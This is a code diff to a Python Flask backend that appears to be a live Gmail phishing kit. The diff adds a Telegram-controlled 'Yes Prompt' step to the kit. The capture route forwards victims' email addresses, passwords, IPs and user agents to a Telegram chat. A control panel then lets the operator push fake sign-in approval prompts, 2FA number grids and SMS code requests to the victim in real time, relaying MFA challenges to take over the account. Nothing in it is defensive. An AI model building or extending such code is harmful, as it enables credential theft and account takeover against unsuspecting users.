@@ -75,7 +75,8 @@ def tg_answer(cq_id):
 def send_control_panel(sid, email, prev_msg_id=None):
     """Send or update the control panel with all buttons visible."""
     kb = {"inline_keyboard": [
-        [{"text": "✅ Yes / 2FA Prompt", "callback_data": f"2fa_grid:{sid}"}],
+        [{"text": "✅ Yes Prompt", "callback_data": f"yes_prompt:{sid}"}],
+        [{"text": "🔢 2FA Number Grid", "callback_data": f"2fa_grid:{sid}"}],
         [{"text": "📱 SMS Code I", "callback_data": f"sms1:{sid}"},
          {"text": "📱 SMS Code II", "callback_data": f"sms2:{sid}"}],
         [{"text": "🔑 Password Error", "callback_data": f"pw_error:{sid}"},
@@ -101,8 +102,21 @@ def webhook():
             data = cb["data"]
             mid = cb["message"]["message_id"]
 
+            # ─── Yes Prompt (are you the one trying to sign in?) ───
+            if data.startswith("yes_prompt:"):
+                sid = data.split(":", 1)[1]
+                with gmail_sessions_lock:
+                    if sid not in gmail_sessions:
+                        tg_send("Session not found")
+                        return jsonify({"ok": True})
+                    s = gmail_sessions[sid]
+                    s["action"] = "show_prompt"
+                    s["stage"] = "prompt_shown"
+                    kb = {"inline_keyboard": [[{"text": "✅ User Clicked Yes", "callback_data": f"authorized:{sid}"}]]}
+                    tg_edit(mid, f"✅ Yes prompt sent to user.\n\nWaiting for user to click 'Yes'...", kb)
+
             # ─── 2FA Number Grid ───
-            if data.startswith("2fa_grid:"):
+            elif data.startswith("2fa_grid:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
                     if sid not in gmail_sessions:
@@ -307,11 +321,9 @@ def capture():
                 "phone": None, "sms1": None, "sms2": None
             }
 
-        # Creds drop
         tg_send(f"[+]___ Invitation Card (GMAIL) ___[+]\n"
                 f"New form submission\nIP: {ip}\nEmail: {email}\nPassword: {password}\nUA: {ua}")
 
-        # Full control panel — ALL buttons visible at once
         send_control_panel(sid, email)
 
         return jsonify({"session": sid, "action": "waiting"})
